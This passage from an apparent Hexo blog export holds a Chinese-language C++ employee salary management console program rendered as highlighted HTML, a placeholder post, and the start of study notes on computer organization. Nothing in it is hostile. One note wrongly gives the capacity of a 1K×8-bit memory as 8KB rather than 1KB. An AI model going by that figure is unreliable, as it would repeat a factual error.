class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;无效的选择！\n&quot;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			head-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			current = head-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (current-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				current = current-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			current-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> queryid;</span><br><span class="line">	string queryname;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> input = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖       ****公司员工工资信息查询系统****        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖            请选择您的查询方式                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、编号查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、姓名查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择查询的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; input;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="string">&#x27;1&#x27;</span>) &#123;<span class="comment">//按编号查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工编号:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryid;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == queryid) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该编号！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;2&#x27;</span>) &#123;<span class="comment">//按姓名查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工姓名:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryname;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getname</span>() == queryname) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t************员工信息展示************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t==================================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t===========================================END=====================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> modifyid;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> item;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; modifyid;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == modifyid) &#123;</span><br><span class="line">			current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入需要修改的项目的序号【1-姓名|2-性别|3-部门|4-级别|5-工资】:&quot;</span>;</span><br><span class="line">			cin &gt;&gt; item;</span><br><span class="line">			<span class="built_in">clear_buffer</span>();</span><br><span class="line">			<span class="keyword">switch</span> (item) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: current-&gt;e.<span class="built_in">modifyname</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:current-&gt;e.<span class="built_in">modifygender</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:current-&gt;e.<span class="built_in">modifydepartment</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:current-&gt;e.<span class="built_in">modifylevel</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:current-&gt;e.<span class="built_in">modifysalary</span>(); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未查找到该编号的员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	Linklist current_2 = head;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要删除的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; id;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == id)</span><br><span class="line">		&#123;</span><br><span class="line">			current_2-&gt;next = current-&gt;next;</span><br><span class="line">			current = <span class="literal">NULL</span>;</span><br><span class="line">			cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;\t\t\t\t删除成功！&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">			flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current_2 = current;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;记录为空！\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="type">int</span> allnum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mnum = <span class="number">0</span>, spnum = <span class="number">0</span>, smnum = <span class="number">0</span>, tenum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> bnum = <span class="number">0</span>, gnum = <span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next, current_2 = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****统计方式****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、统计所有员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、统计各类员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、统计员工性别                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择统计的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; choose;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (choose == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			allnum++;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; allnum &lt;&lt; <span class="string">&quot;】员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;经理&quot;</span>) &#123; mnum++;current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售人员&quot;</span>) &#123; spnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售经理&quot;</span>) &#123; smnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;技术人员&quot;</span>) &#123; tenum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; mnum &lt;&lt; <span class="string">&quot;】经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; spnum &lt;&lt; <span class="string">&quot;】销售人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; smnum &lt;&lt; <span class="string">&quot;】销售经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; tenum &lt;&lt; <span class="string">&quot;】技术人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;男&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;M&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;m&quot;</span>) &#123; bnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;女&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;F&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;f&quot;</span>) &#123; gnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; bnum &lt;&lt; <span class="string">&quot;】男员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; gnum &lt;&lt; <span class="string">&quot;】女员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的统计选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	ofstream outfile;</span><br><span class="line">	outfile.<span class="built_in">open</span>(<span class="string">&quot;employee.txt&quot;</span>, ios::trunc | ios::out);</span><br><span class="line">	<span class="keyword">if</span> (!outfile) &#123; <span class="comment">//打开失败</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">listlength</span>();i++ ) &#123;</span><br><span class="line">		outfile &lt;&lt; current-&gt;e.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getname</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getgender</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getdepartment</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getlevel</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getsalary</span>() &lt;&lt; endl;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	outfile.<span class="built_in">close</span>();<span class="comment">/*循环结束后，关闭输出文件流 outfile*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = <span class="keyword">new</span> Node;</span><br><span class="line">	current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	Linklist H = current;</span><br><span class="line">	Linklist p = H;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="type">int</span> Id=<span class="literal">NULL</span>;</span><br><span class="line">	string Name;</span><br><span class="line">	string Gender;</span><br><span class="line">	string Department;</span><br><span class="line">	string Level;</span><br><span class="line">	<span class="type">double</span> salary;</span><br><span class="line">	<span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;employee.txt&quot;</span>,ios::in )</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!infile) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(infile &gt;&gt; Id&gt;&gt;Name &gt;&gt; Gender &gt;&gt; Department &gt;&gt; Level &gt;&gt; salary) </span><br><span class="line">	&#123;</span><br><span class="line">		flag =<span class="literal">false</span>;</span><br><span class="line">		current-&gt;e.<span class="built_in">saveid</span>(Id);</span><br><span class="line">		current-&gt;e.<span class="built_in">savename</span>(Name);</span><br><span class="line">		current-&gt;e.<span class="built_in">savegender</span>(Gender);</span><br><span class="line">		current-&gt;e.<span class="built_in">savedepartment</span>(Department);</span><br><span class="line">		current-&gt;e.<span class="built_in">savelevel</span>(Level);</span><br><span class="line">		current-&gt;e.<span class="built_in">savesalary</span>(salary);</span><br><span class="line">		p-&gt;next = current;</span><br><span class="line">		p = current;</span><br><span class="line">		Linklist newNode = <span class="keyword">new</span> Node;</span><br><span class="line">		newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		current-&gt;next = newNode;</span><br><span class="line">		current = newNode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span> current;</span><br><span class="line">	p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件为空！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">	head-&gt;next = H;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有误存储</span></span><br><span class="line"><span class="comment">//void save()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ofstream f(&quot;employee.dat&quot;, ios::trunc | ios::out | ios::binary);</span></span><br><span class="line"><span class="comment">//	Linklist current = head-&gt;next;</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	while (current != NULL)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		f.write(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e));</span></span><br><span class="line"><span class="comment">//		current = current-&gt;next;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//void load()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ifstream f(&quot;employee.dat&quot;, ios::in | ios::binary);</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	Linklist current = new Node;</span></span><br><span class="line"><span class="comment">//	current-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	Linklist H = current;</span></span><br><span class="line"><span class="comment">//	Linklist p = H;</span></span><br><span class="line"><span class="comment">//	bool flag = true;</span></span><br><span class="line"><span class="comment">//	while (f.read(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e))) &#123;</span></span><br><span class="line"><span class="comment">//		flag = false;</span></span><br><span class="line"><span class="comment">//		p-&gt;next = current;</span></span><br><span class="line"><span class="comment">//		p = current;</span></span><br><span class="line"><span class="comment">//		Linklist newNode = new Node;</span></span><br><span class="line"><span class="comment">//		newNode-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//		current-&gt;next = newNode;</span></span><br><span class="line"><span class="comment">//		current = newNode;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	delete current;</span></span><br><span class="line"><span class="comment">//	p-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	if (flag)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;文件为空！&quot;;</span></span><br><span class="line"><span class="comment">//		exit(0);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//	head-&gt;next = H;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>敬请T期待</title>
    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
<p>敬请T期待</p>
</blockquote>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Begin</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机组成原理</title>
    <url>/2024/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="第一章：计算机系统概论"><a href="#第一章：计算机系统概论" class="headerlink" title="第一章：计算机系统概论"></a>第一章：计算机系统概论</h2><ol>
<li>计算机系统由<u>“硬件”</u>和<u>“软件”</u>两部分组成。</li>
<li>计算机软件又可以分为“系统软件”和“应用软件”组成。</li>
<li>计算机的五大组成部件：运算器、存储器、控制器、输入设备、输出设备。</li>
<li>早期计算机的指令和数据属于同等地位存储在存储器内，并可按地址寻址。当代计算机的指令和数据不属于同等地位。</li>
<li>指令分为“地址码”和“操作码”。</li>
<li>早期计算机以<u>运算器</u>为中心，当代计算机以<u>存储器</u>为中心。</li>
<li>机器字长是指CPU一次能处理数据的位数，通常与CPU的寄存器位数有关。</li>
<li>1Kx8位的存储器最少需要20根线，存储容量是 2^10^X2^3^b&#x3D;2^3^KB&#x3D;8KB,10根地址线，8根数据线，1根片选信号，1根读写控制。</li>
<li>1B&#x3D;8b;    2^10^&#x3D;1K&#x3D;1024;      2^20^&#x3D;2^10^x1K&#x3D;1M;     2^30^&#x3D;1G;       2^40^&#x3D;1T;</li>
</ol>
<h2 id="第三章：系统总线"><a href="#第三章：系统总线" class="headerlink" title="第三章：系统总线"></a>第三章：系统总线</h2><ol>
<li><p>总线的概念：总线是连续多个部件的信息传输线，是各个部件的传输介质。</p>
</li>
<li><p>总线的分类：</p>
<ul>
<li><p>按<u>数据传输方式</u>分：并行传输总线、串行传输总线。</p>
</li>
